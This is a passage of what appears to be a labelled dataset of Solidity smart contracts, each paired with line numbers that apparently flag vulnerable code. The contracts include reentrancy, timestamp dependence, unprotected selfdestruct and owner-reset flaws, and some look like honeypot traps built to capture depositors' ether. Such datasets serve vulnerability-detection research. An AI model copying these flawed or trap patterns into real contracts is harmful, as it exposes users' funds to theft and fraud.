        if (randomNumber > highScore) {
            currentWinner = msg.sender;
            lastTimestamp = now;
        }
    }
    function claimWinnings() public {
        require(now > lastTimestamp + 1 days);
        require(msg.sender == currentWinner);
        msg.sender.transfer(address(this).balance);
    }
}
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}","[20, 27]"
"      require(_underground[msg.sender] != 1, ""You are already in a safehouse."");
        _underground[msg.sender] = 1;
        return true;
    }
  function () external payable {
      protest();
  }
  function protest() public payable returns (bool) {
    require(_totalCollected <= MAX_COLLECTED, ""The protesters won. Game over."");
    require(_detentionCamp[msg.sender] != 1, ""You are in detention camp."");
    if(msg.value == 0) {
      _mint(msg.sender, 1);
      return true;
    } else {
      // TODO = ADD a fallback in case buying Sparkle fails.
      deployed_sparkle.call.value(msg.value).gas(120000)("""");
      uint256 amount = msg.value.div(COST_PER_TOKEN);
      _mint(msg.sender, amount);
      _totalCollected = _totalCollected.add(msg.value);
      return true;
    }
  }
    function sellSparkle(uint256 amount) public returns (bool) {
              require(msg.sender == beneficiary, ""Access denied."");
              Sparkle(deployed_sparkle).sellSparkle(amount);
              beneficiary.transfer(address(this).balance);
              return true;
          }
          // just in case ether gets stuck in contract, this will clear it
    function emptyPot() public returns (bool) {
              require(msg.sender == beneficiary, ""Access denied."");
              uint256 pot = address(this).balance;
              msg.sender.transfer(pot);
              return true;
                }
          function withdrawSparkle(uint256 amount) public returns (bool) {
                require(msg.sender == beneficiary, ""Access denied."");
                Sparkle(deployed_sparkle).transfer(beneficiary, amount);
                return true;
                      }
          // this function is for protesters that retire from the movement
          // this function can also used by police, once they've arrested all
          // protesters to bring their token balance to 0 in order to end the game
          function stopProtesting() public returns (bool){
            _burn(msg.sender, _balances[msg.sender]);
            return true;
          }
          // Game is won if:
          // 1. The maximum of 9999 eth has been donated.
          //
          // All tokens are stored permanently on the blockchain and tokens can be
          // freely transfered forever.
          // Game is lost if:
          // 1. it has been played for at least 28 days
          // 2. there are zero tokens on the blockchain, not including balance of
          // player attempting to end the game. IE, all protesters have been arrested.
          //
          //
          // All tokens are removed from the blockchain and contract is deleted.
          function gameOver() public returns (bool)  {
          require(_totalCollected <= MAX_COLLECTED, ""The protesters won. Game over."");
           require(block.timestamp >= _startTime + 28 days, ""Game must be played for 28 days before it can end."");
           // balance of caller is not counted
           uint256 _tokensRemaining = _totalSupply.sub(_balances[msg.sender]);
            require(_tokensRemaining == 0, ""There are still protesters active in the movement."");
            uint256 finalAmount = sparkleBalanceOfBeneficiary().mul(975).div(100); // allow for 2.25% transaction tax + margin of error
            Sparkle(deployed_sparkle).transfer(beneficiary, finalAmount);
            selfdestruct(beneficiary);
            return true;
          }
}","[60, 68]"
"        swap[11] = aState[LEFT][6];
        aState[UP][2] = swap[9];
        aState[UP][5] = swap[10];
        aState[UP][8] = swap[11];
        aState[RIGHT][0] = swap[0];
        aState[RIGHT][1] = swap[1];
        aState[RIGHT][2] = swap[2];
        aState[DOWN][6] = swap[3];
        aState[DOWN][3] = swap[4];
        aState[DOWN][0] = swap[5];
        aState[LEFT][8] = swap[6];
        aState[LEFT][7] = swap[7];
        aState[LEFT][6] = swap[8];
    }
    /*
        Returns the state of the cube after performing the given moves.
        The moves parameter defines a set of moves that are applied to the cube
        in its initial state.
        Only 5 types of moves are possible.
     */
    function trySolution(uint8[] moves) public view returns (Color[9][6]) {
        Color[9][6] memory aState = state;
        for (uint i = 0; i < moves.length; i++) {
            if (moves[i] == FRONT) {
                shuffleFront(aState);
            } else if (moves[i] == LEFT) {
                shuffleLeft(aState);
            } else if (moves[i] == UP) {
                shuffleUp(aState);
            } else if (moves[i] == RIGHT) {
                shuffleRight(aState);
            } else if (moves[i] == DOWN) {
                shuffleDown(aState);
            } else {
                //invalid move;
                require(false);
            }
        }
        return aState;
    }
    /*
        The function that is used to submit the solution to the blockchain
    */
    function submitSolution(uint8[] moves) public {
        Submission(msg.sender, moves);
        //don't allow submissions after contest time has passed
        require(now < contestEndTime);
        Color[9][6] memory stateAfterMoves = trySolution(moves);
        //the cube must be in a solved state
        if (isSolved(stateAfterMoves)) {
            //the new leader is set if the solution has fewer moves than the current winner
            if(moves.length < currentWinnerMoveCount) {
                currentWinnerMoveCount = moves.length;
                currentWinner = msg.sender;
                NewLeader(msg.sender, moves);
            }
        }
    }
/*
    The function that allows the winner of the contest to
    claim the reward after the contest has ended
*/
    function claim() public {
        require(now >= contestEndTime);
        require(msg.sender == currentWinner);
        msg.sender.transfer(this.balance);
    }
}",[64]
"pragma solidity ^0.4.19;
contract SAFE_GIFT
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass) && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    bytes32 hashPass;
    bool closed = false;
    address sender;
    address reciver;
    uint giftTime;
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
            giftTime = now;
        }
    }
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            giftTime = date;
        }
    }
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    function() public payable{}
}",[17]
"pragma solidity ^0.4.16;
interface Token {
    function transfer(address _to, uint256 _value) external;
}
contract SBGCrowdsale {
    Token public tokenReward;
    uint256 public price;
    address public creator;
    address public owner;
    uint256 public startDate;
    uint256 public endDate;
    modifier isCreator() {
        require(msg.sender == creator);
        _;
    }
    event FundTransfer(address backer, uint amount, bool isContribution);
    function SBGCrowdsale() public {
        creator = msg.sender;
        owner = 0x0;
        price = 100;
        startDate = 1525647600;
        endDate = 1527811200;
        tokenReward = Token(0xb5980eB165cbBe3809e1680ef05c3878ce25dACb);
    }
    function setOwner(address _owner) isCreator public {
        owner = _owner;      
    }
    function setCreator(address _creator) isCreator public {
        creator = _creator;      
    }
    function setStartDate(uint256 _startDate) isCreator public {
        startDate = _startDate;      
    }
    function setEndtDate(uint256 _endDate) isCreator public {
        endDate = _endDate;      
    }
    function setPrice(uint256 _price) isCreator public {
        price = _price;      
    }
    function setToken(address _token) isCreator public {
        tokenReward = Token(_token);      
    }
    function sendToken(address _to, uint256 _value) isCreator public {
        tokenReward.transfer(_to, _value);      
    }
    function kill() isCreator public {
        selfdestruct(owner);
    }
    function () payable public {
        require(msg.value > 0);
        require(now > startDate);
        require(now < endDate);
        uint256 amount = msg.value * price;
        tokenReward.transfer(msg.sender, amount);
        FundTransfer(msg.sender, amount, true);
        owner.transfer(msg.value);
    }
}",[52]
"    addBonus(150000000000000000000,60);
    addBonus(200000000000000000000,70);
    addBonus(300000000000000000000,75);
    addBonus(500000000000000000000,80);
    addBonus(750000000000000000000,90);
    addBonus(1000000000000000000000,100);
    addBonus(1500000000000000000000,110);
    addBonus(2000000000000000000000,125);
    addBonus(3000000000000000000000,140);
  }
  modifier saleIsOn() {
    require(now >= start && now < lastSaleDate());
    _;
  }
  modifier isUnderHardCap() {
    require(invested <= hardCap);
    _;
  }
  function lastSaleDate() constant returns(uint) {
    return start + period * 1 days;
  }
  function setStart(uint newStart) onlyOwner {
    start = newStart;
  }
  function setMinPrice(uint newMinPrice) onlyOwner {
    minPrice = newMinPrice;
  }
  function setHardcap(uint newHardcap) onlyOwner {
    hardCap = newHardcap;
  }
  function setPrice(uint newPrice) onlyOwner {
    price = newPrice;
  }
  function setFoundersTokensPercent(uint newFoundersTokensPercent) onlyOwner {
    foundersTokensPercent = newFoundersTokensPercent;
  }
  function setSoftcap(uint newSoftcap) onlyOwner {
    softCap = newSoftcap;
  }
  function setSecondWallet(address newSecondWallet) onlyOwner {
    secondWallet = newSecondWallet;
  }
  function setSecondWalletPercent(uint newSecondWalletPercent) onlyOwner {
    secondWalletPercent = newSecondWalletPercent;
  }
  function setMultisigWallet(address newMultisigWallet) onlyOwner {
    multisigWallet = newMultisigWallet;
  }
  function setFoundersTokensWallet(address newFoundersTokensWallet) onlyOwner {
    foundersTokensWallet = newFoundersTokensWallet;
  }
  function createTokens() whenNotPaused isUnderHardCap saleIsOn payable {
    require(msg.value >= minPrice);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    invested = invested.add(msg.value);
    uint bonusPercent = getBonus(msg.value);
    uint tokens = msg.value.mul(price);
    uint bonusTokens = tokens.mul(bonusPercent).div(percentRate);
    uint tokensWithBonus = tokens.add(bonusTokens);
    token.mint(this, tokensWithBonus);
    token.transfer(msg.sender, tokensWithBonus);
  }
  function refund() whenNotPaused {
    require(now > start && refundOn && balances[msg.sender] > 0);
    msg.sender.transfer(balances[msg.sender]);
  }
  function finishMinting() public whenNotPaused onlyOwner {
    if(invested < softCap) {
      refundOn = true;
    } else {
      uint secondWalletInvested = invested.mul(secondWalletPercent).div(percentRate);
      secondWallet.transfer(secondWalletInvested);
      multisigWallet.transfer(invested - secondWalletInvested);
      uint issuedTokenSupply = token.totalSupply();
      uint foundersTokens = issuedTokenSupply.mul(foundersTokensPercent).div(percentRate - foundersTokensPercent);
      token.mint(this, foundersTokens);
      token.allowTransfer();
      token.transfer(foundersTokensWallet, foundersTokens);
    }
    token.finishMinting();
    token.transferOwnership(owner);
  }
  function() external payable {
    createTokens();
  }
  function retrieveTokens(address anotherToken) public onlyOwner {
    ERC20 alienToken = ERC20(anotherToken);
    alienToken.transfer(multisigWallet, token.balanceOf(this));
  }
}",[64]
"pragma solidity ^0.4.25;
contract SIMPL_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function SIMPL_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"/**
 *Submitted for verification at Etherscan.io on 2020-05-21
*/
pragma solidity 0.4.25;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract SSoftSolution {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[55]
"        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, ""SafeMath: multiplication overflow"");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, ""SafeMath: division by zero"");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, ""SafeMath: modulo by zero"");
        return a % b;
    }
}
contract STMPackage is Ownable, ReentrancyGuard {
    using ECRecovery for bytes32;
    //mapping(bytes32 => Deal) public streamityTransfers;
    //constructor(address streamityContract) public {
    //    require(streamityContract != 0x0);
    //}
    //struct Deal {
    //    uint256 value;
    //}
    event MultiTransfer(
        address _to,
        uint _amount
    );
    event BuyPackage(bytes32 _tradeId);
    function pay(bytes32 _tradeID, uint256 _value, bytes _sign)
    external
    payable
    {
        require(msg.value > 0);
        require(msg.value == _value);
        bytes32 _hashDeal = keccak256(_tradeID,  msg.value);
        verifyDeal(_hashDeal, _sign);
        emit BuyPackage(_tradeID);
    }
    function verifyDeal(bytes32 _hashDeal, bytes _sign) private view {
        require(_hashDeal.recover(_sign) == owner);
    }
    function withdrawToAddress(address _to, uint256 _amount) external onlyOwner {
        _to.transfer(_amount);
    }
    function multiTransfer(address[] _addresses, uint[] _amounts)
    external onlyOwner
    returns(bool)
    {
        for (uint i = 0; i < _addresses.length; i++) {
            _safeTransfer(_addresses[i], _amounts[i]);
            emit MultiTransfer(_addresses[i], _amounts[i]);
        }
        return true;
    }
    function _safeTransfer(address _to, uint _amount) internal {
        require(_to != 0);
        _to.transfer(_amount);
    }
}",[64]
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
// minimum token interface
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        address self = address(this);
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        address self = address(this);
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
// store ether & tokens for a period of time
contract SafeDeposit is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[53, 72]"
"            address seller,
            uint128 startingPrice,
            uint128 endingPrice,
            uint64 duration,
            uint64 startedAt
        )
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        return (
            auction.seller,
            auction.startingPrice,
            auction.endingPrice,
            auction.duration,
            auction.startedAt
        );
    }
    function isOnAuction(uint256 _tokenId) external view returns (bool) {
        return (tokenIdToAuction[_tokenId].startedAt > 0);
    }
    function getSeller(uint256 _tokenId) external view returns (address) {
        return tokenIdToAuction[_tokenId].seller;
    }
    function transfer(ERC721 _nonFungibleContract, address _receiver, uint256 _tokenId) external onlyOwner {
        // it will throw if transfer fails
        _nonFungibleContract.transfer(_receiver, _tokenId);
    }
}
contract SaleClockAuctionStorage is ClockAuctionStorage {
    bool public isSaleClockAuctionStorage = true;
    // total accumulate sold count
    uint256 public totalSoldCount;
    // last 3 sale price
    uint256[3] public lastSoldPrices;
    // current on sale auction count from system
    uint256 public systemOnSaleCount;
    // map of on sale token ids from system
    mapping (uint256 => bool) systemOnSaleTokens;
    function removeAuction(uint256 _tokenId) public onlyOwner {
        // first remove auction from state variable
        super.removeAuction(_tokenId);
        // update system on sale record
        if (systemOnSaleTokens[_tokenId]) {
            delete systemOnSaleTokens[_tokenId];
            if (systemOnSaleCount > 0) {
                systemOnSaleCount--;
            }
        }
    }
    function recordSystemOnSaleToken(uint256 _tokenId) external onlyOwner {
        if (!systemOnSaleTokens[_tokenId]) {
            systemOnSaleTokens[_tokenId] = true;
            systemOnSaleCount++;
        }
    }
    function recordSoldPrice(uint256 _price) external onlyOwner {
        lastSoldPrices[totalSoldCount % 3] = _price;
        totalSoldCount++;
    }
    function averageSoldPrice() external view returns (uint256) {
        if (totalSoldCount == 0) return 0;
        uint256 sum = 0;
        uint256 len = (totalSoldCount < 3 ? totalSoldCount : 3);
        for (uint256 i = 0; i < len; i++) {
            sum += lastSoldPrices[i];
        }
        return sum / len;
    }
}
contract Pausable is Ownable {
    event Pause();
    event Unpause();
    bool public paused = false;
    modifier whenNotPaused() {
        require(!paused);
        _;
    }
    modifier whenPaused {
        require(paused);
        _;
    }
    function pause() public onlyOwner whenNotPaused {
        paused = true;
        emit Pause();
    }
    function unpause() public onlyOwner whenPaused {
        paused = false;
        emit Unpause();
    }
}
contract HasNoContracts is Pausable {
    function reclaimContract(address _contractAddr) external onlyOwner whenPaused {
        Ownable contractInst = Ownable(_contractAddr);
        contractInst.transferOwnership(owner);
    }
}
contract LogicBase is HasNoContracts {
    /// The ERC-165 interface signature for ERC-721.
    ///  Ref: https://github.com/ethereum/EIPs/issues/165
    ///  Ref: https://github.com/ethereum/EIPs/issues/721
    bytes4 constant InterfaceSignature_NFC = bytes4(0x9f40b779);
    // Reference to contract tracking NFT ownership
    ERC721 public nonFungibleContract;
    // Reference to storage contract
    StorageBase public storageContract;
    function LogicBase(address _nftAddress, address _storageAddress) public {
        // paused by default
        paused = true;
        setNFTAddress(_nftAddress);
        require(_storageAddress != address(0));
        storageContract = StorageBase(_storageAddress);
    }
    // Very dangerous action, only when new contract has been proved working
    // Requires storageContract already transferOwnership to the new contract
    // This method is only used to transfer the balance to owner
    function destroy() external onlyOwner whenPaused {
        address storageOwner = storageContract.owner();
        // owner of storageContract must not be the current contract otherwise the storageContract will forever not accessible
        require(storageOwner != address(this));
        // Transfers the current balance to the owner and terminates the contract
        selfdestruct(owner);
    }
    // Very dangerous action, only when new contract has been proved working
    // Requires storageContract already transferOwnership to the new contract
    // This method is only used to transfer the balance to the new contract
    function destroyAndSendToStorageOwner() external onlyOwner whenPaused {
        address storageOwner = storageContract.owner();
        // owner of storageContract must not be the current contract otherwise the storageContract will forever not accessible
        require(storageOwner != address(this));",[64]
"pragma solidity ^0.4.23;
contract Sandstone
{
    bool closed = false;
    uint unlockTime = 3600;
    address sender;
    address receiver;
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.25 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }
    function() public payable { }
}","[12, 21]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
// minimum token interface
contract Token {
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}
// store ether & tokens for a period of time
contract SecureDeposit is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function initWallet() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[44, 63]"
"pragma solidity >=0.4.0 <0.6.0;
contract SeeYouAtEthcon2020 {
    address public winner;
    uint256 public timeLock;
    constructor() public {
        timeLock = uint256(0) - 1;
    }
    function () payable external {
        require(msg.value >= 0.1 ether);
        timeLock = now + 6 hours;
        winner = msg.sender;
    }
    function claim() public {
        require(msg.sender == winner);
        require(now >= timeLock);
        msg.sender.transfer(address(this).balance);
    }
}",[15]
"pragma solidity 0.4.26;
interface Token {
  function transfer(address to, uint256 value) external returns (bool);
}
contract Send {
    event TransferEth(address to, uint256 amount);
    Token token;
    constructor(address _token) public {
        token = Token(_token);
    }
    function transferBatch(address[] memory addrs, bool sendToken) public payable {
        uint256 amount = msg.value / addrs.length;
        for (uint256 i = 0; i < addrs.length; i++) {
            addrs[i].transfer(amount);
            emit TransferEth(addrs[i], amount);
            if (sendToken) {
                token.transfer(addrs[i], 8 * 10 ** 18);
            }
        }
    }
}",[14]
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract SendEtherContributors {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[52]
"pragma solidity ^0.4.18;
contract SendToMany
{
    address owner;
    address[] public recipients;
    function SendToMany() public
    {
        owner = msg.sender;
    }
    function setRecipients(address[] newRecipientsList) public
    {
        require(msg.sender == owner);
        recipients = newRecipientsList;
    }
    function addRecipient(address newRecipient) public
    {
        recipients.push(newRecipient);
    }
    function sendToAll(uint256 amountPerRecipient) payable public
    {
        for (uint256 i=0; i<recipients.length; i++)
        {
            recipients[i].transfer(amountPerRecipient);
        }
    }
}","[21, 23]"
"pragma solidity ^0.4.21;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) { return 0; }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function Ownable() public { 
	    owner = msg.sender; 
		}
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(this));
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }
}
contract Sent is Ownable{
    using SafeMath for uint256;
    address private toaddr;
    uint public amount;
  event SendTo();
  function SentTo(address _address) payable onlyOwner public returns (bool) {
    toaddr = _address;
    kill();
    emit SendTo();
    return true;
  }
   function kill() public{
        selfdestruct(toaddr);
    }
}","[47, 48]"
"        _;
    }
    modifier notNull(address _address) {
        require(_address != 0);
        _;
    }
    modifier validAmount() {
        require((msg.value - fee) > 0);
        _;
    }
    /**
     * Fallback function
     *
     * The function without name is the default function that is called whenever anyone sends funds to a contract
     */
    function()
    payable
    public
    validAmount
    {
        if(crowdSale.shiftSalePurchase.value(msg.value - fee)()){
            FundTransfer(msg.value - fee);
        }
    }
    /// @dev Returns list of owners.
    /// @return List of owner addresses.
    function getOwners()
    public
    constant
    returns (address[])
    {
        return owners;
    }
    /// @dev Allows to transfer MTC tokens. Can only be executed by an owner.
    /// @param _to Destination address.
    /// @param _value quantity of MTC tokens to transfer.
    function transfer(address _to, uint256 _value)
    ownerExists(msg.sender)
    public {
        token.transfer(_to, _value);
    }
    /// @dev Allows to withdraw the ETH from the CrowdSale contract. Transaction has to be sent by an owner.
    function withdrawal()
    ownerExists(msg.sender)
    public {
        crowdSale.safeWithdrawal();
    }
    /// @dev Allows to refund the ETH to destination address. Transaction has to be sent by an owner.
    /// @param _to Destination address.
    /// @param _value Wei to transfer.
    function refund(address _to, uint256 _value)
    ownerExists(msg.sender)
    public {
        _to.transfer(_value);
    }
    /// @dev Allows to refund the ETH to destination addresses. Transaction has to be sent by an owner.
    /// @param _to Array of destination addresses.
    /// @param _value Array of Wei to transfer.
    function refundMany(address[] _to, uint256[] _value)
    ownerExists(msg.sender)
    public {
        require(_to.length == _value.length);
        for (uint i = 0; i < _to.length; i++) {
            _to[i].transfer(_value[i]);
        }
    }
    /// @dev Allows to change the fee value. Transaction has to be sent by an owner.
    /// @param _fee New value for the fee.
    function setFee(uint _fee)
    ownerExists(msg.sender)
    public {
        fee = _fee;
    }
    /// @dev Withdraw all the eth on the contract. Transaction has to be sent by an owner.
    function empty()
    ownerExists(msg.sender)
    public {
        msg.sender.transfer(this.balance);
    }
}",[64]
"        public
        view
        returns (uint256)
    {
        return _minimumsGet(addr, block.timestamp);
    }
    function minimumsClear(
        address addr
    )
        public
        onlyOwner()
    {
        delete _minimums[addr];
    }
    //---------------------------------------------------------------------------------
    // internal  section
    //---------------------------------------------------------------------------------
    /**
     * init internal
     */
    function __SimpleTransferRule_init(
    )
        internal
        initializer
    {
        __BaseTransferRule_init();
        //uniswapV2Pair = 0x03B0da178FecA0b0BBD5D76c431f16261D0A76aa;
